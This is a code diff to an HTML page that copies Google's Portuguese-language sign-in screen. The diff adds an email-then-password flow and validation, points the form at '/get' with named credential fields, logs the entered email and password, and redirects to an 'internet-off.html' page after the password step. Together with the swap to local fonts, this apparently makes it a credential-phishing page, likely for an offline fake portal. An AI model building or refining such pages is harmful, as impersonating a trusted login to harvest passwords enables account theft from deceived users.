@@ -4,16 +4,16 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Google Sign In</title>
-    <link
-      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap"
-      rel="stylesheet"
-    />
     <style>
+      @font-face {
+        font-family: "LocalRoboto";
+        src: local("Arial"), local("Helvetica"), local("sans-serif");
+      }
       * {
         box-sizing: border-box;
       }
       body {
-        font-family: "Roboto", sans-serif;
+        font-family: "LocalRoboto", sans-serif;
         display: flex;
         justify-content: center;
         align-items: center;
@@ -177,6 +177,10 @@
       .aside-right-actions a:hover::before {
         opacity: 1;
       }
+      .input-container {
+        position: relative;
+        margin-bottom: 20px;
+      }
       input[type="text"],
       input[type="email"],
       input[type="password"] {
@@ -187,6 +191,31 @@
         border-radius: 4px;
         box-sizing: border-box;
         font-weight: 400;
+        transition: border-color 0.3s ease;
+      }
+      input[type="text"]:focus,
+      input[type="email"]:focus,
+      input[type="password"]:focus {
+        outline: none;
+        border-color: #1a73e8;
+      }
+      .input-label {
+        position: absolute;
+        left: 15px;
+        top: 15px;
+        font-size: 15.5px;
+        color: #5f6368;
+        transition: all 0.3s ease;
+        pointer-events: none;
+      }
+      input:focus + .input-label,
+      input:not(:placeholder-shown) + .input-label {
+        top: -8px;
+        left: 10px;
+        font-size: 12px;
+        background-color: white;
+        padding: 0 5px;
+        color: #1a73e8;
       }
       button {
         background-color: #0b57d0;
@@ -286,6 +315,30 @@
         box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.4);
       }
 
+      #user-info {
+        display: none;
+        align-items: center;
+        gap: 7px;
+        border: 1px solid #e0e0e0;
+        padding: 5px 30px 5px 7px;
+        border-radius: 100px;
+      }
+
+      #user-info span {
+        position: relative;
+      }
+
+      #user-info span::after {
+        content: "\25BE";
+        position: absolute;
+        top: 40%;
+        right: -15px;
+        transform: translateY(-50%);
+        pointer-events: none;
+        color: #5f6368;
+        font-size: 14px;
+      }
+
       @media screen and (max-width: 795px) {
         .main {
           max-width: 450px;
@@ -357,6 +410,14 @@
           padding: 0;
         }
       }
+      .error {
+        border-color: #d93025 !important;
+      }
+      .error-text {
+        color: #d93025;
+        font-size: 12px;
+        margin-top: 5px;
+      }
     </style>
   </head>
   <body>
@@ -390,26 +451,59 @@
             />
           </svg>
           <div>
-            <h1>Fazer login</h1>
-            <p>Use sua Conta do Google</p>
+            <h1 id="greeting">Fazer login</h1>
+            <p id="user-info-text">Use sua Conta do Google</p>
+            <div id="user-info">
+              <svg
+                aria-hidden="true"
+                class="Qk3oof"
+                fill="currentColor"
+                focusable="false"
+                width="18px"
+                height="18px"
+                viewBox="0 0 24 24"
+                xmlns="https://www.w3.org/2000/svg"
+              >
+                <path
+                  d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"
+                ></path>
+              </svg>
+              <span id="user-email"></span>
+            </div>
           </div>
         </div>
-        <form class="aside-right">
+        <form class="aside-right" id="login-form" novalidate action="/get">
           <div>
             <div class="aside-right-header">
-              <input
-                type="email"
-                placeholder="E-mail ou telefone"
-                id="email-input"
-              />
+              <div class="input-container">
+                <input
+                  type="email"
+                  placeholder=" "
+                  id="email-input"
+                  name="email"
+                  required
+                />
+                <label for="email-input" class="input-label"
+                  >E-mail ou telefone</label
+                >
+                <div class="error-text" id="email-error"></div>
+              </div>
               <a class="commomLink" href="#">Esqueceu seu e-mail?</a>
             </div>
             <div class="password-container">
-              <input
-                type="password"
-                placeholder="Digite sua senha"
-                id="password-input"
-              />
+              <div class="input-container">
+                <input
+                  type="password"
+                  placeholder=" "
+                  id="password-input"
+                  name="password"
+                  required
+                />
+                <label for="password-input" class="input-label"
+                  >Digite sua senha</label
+                >
+                <div class="error-text" id="password-error"></div>
+              </div>
               <div class="password-toggle" onclick="togglePassword()">
                 <input type="checkbox" class="checkbox" id="show-password" />
                 <label for="show-password">Mostrar senha</label>
@@ -426,8 +520,8 @@
             >
           </div>
           <div class="aside-right-actions">
-            <a href="#">Criar conta</a>
-            <button type="button" onclick="showSpinner()">Próxima</button>
+            <a id="secondary-button" href="#">Criar conta</a>
+            <button type="submit" id="submit-button">Próxima</button>
           </div>
         </form>
       </div>
@@ -456,18 +550,33 @@
     </div>
 
     <script>
+      let isEmailStep = true;
+
       function showSpinner() {
+        document.getElementsByClassName("spinner")[0].style.display = "block";
         setTimeout(() => {
           document.getElementsByClassName("spinner")[0].style.display = "none";
+          document.getElementsByClassName("container")[0].style.minHeight =
+            "340px";
+          if (isEmailStep) {
+            document.getElementById("user-info-text").style.display = "none";
+            document.getElementById("greeting").textContent = "Olá!";
+            document.getElementById("user-info").style.display = "flex";
+            document.getElementById("user-email").textContent =
+              document.getElementById("email-input").value;
+            document.getElementsByClassName(
+              "aside-right-header"
+            )[0].style.display = "none";
+            document.getElementsByClassName(
+              "password-container"
+            )[0].style.display = "flex";
+            document.getElementById("secondary-button").textContent =
+              "Esqueceu a senha?";
+            isEmailStep = false;
+          } else {
+            window.location.href = "internet-off.html";
+          }
         }, 500);
-        document.getElementsByClassName("aside-right-header")[0].style.display =
-          "none";
-        document.getElementById("info-text").style.display = "none";
-        document.getElementsByClassName("spinner")[0].style.display = "block";
-        document.getElementsByClassName("password-container")[0].style.display =
-          "flex";
-
-        // Simulate loading
       }
 
       function togglePassword() {
@@ -476,6 +585,83 @@
         if (checkbox.checked) passwordInput.type = "text";
         else passwordInput.type = "password";
       }
+
+      function validateEmail(email) {
+        const re =
+          /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+        return re.test(String(email).toLowerCase());
+      }
+
+      document
+        .getElementById("login-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          const emailInput = document.getElementById("email-input");
+          const passwordInput = document.getElementById("password-input");
+          const email = emailInput.value.trim();
+          const password = passwordInput.value.trim();
+
+          let isValid = true;
+
+          if (isEmailStep) {
+            if (!email || !validateEmail(email)) {
+              isValid = false;
+              emailInput.classList.add("error");
+              document.getElementById("email-error").textContent =
+                "Digite um e-mail válido";
+            } else {
+              emailInput.classList.remove("error");
+              document.getElementById("email-error").textContent = "";
+            }
+          } else {
+            if (!password) {
+              isValid = false;
+              passwordInput.classList.add("error");
+              document.getElementById("password-error").textContent =
+                "Digite sua senha";
+            } else {
+              passwordInput.classList.remove("error");
+              document.getElementById("password-error").textContent = "";
+            }
+          }
+
+          if (isValid) {
+            console.log("Email:", email);
+            console.log("Password:", password);
+            showSpinner();
+          }
+        });
+
+      document
+        .getElementById("email-input")
+        .addEventListener("blur", function () {
+          if (this.value.trim() !== "") {
+            if (!validateEmail(this.value.trim())) {
+              this.classList.add("error");
+              document.getElementById("email-error").textContent =
+                "Digite um e-mail válido";
+            } else {
+              this.classList.remove("error");
+              document.getElementById("email-error").textContent = "";
+            }
+          } else {
+            this.classList.remove("error");
+            document.getElementById("email-error").textContent = "";
+          }
+        });
+
+      document
+        .getElementById("password-input")
+        .addEventListener("blur", function () {
+          if (this.value.trim() !== "") {
+            this.classList.remove("error");
+            document.getElementById("password-error").textContent = "";
+          } else {
+            this.classList.add("error");
+            document.getElementById("password-error").textContent =
+              "Digite sua senha";
+          }
+        });
     </script>
   </body>
 </html>
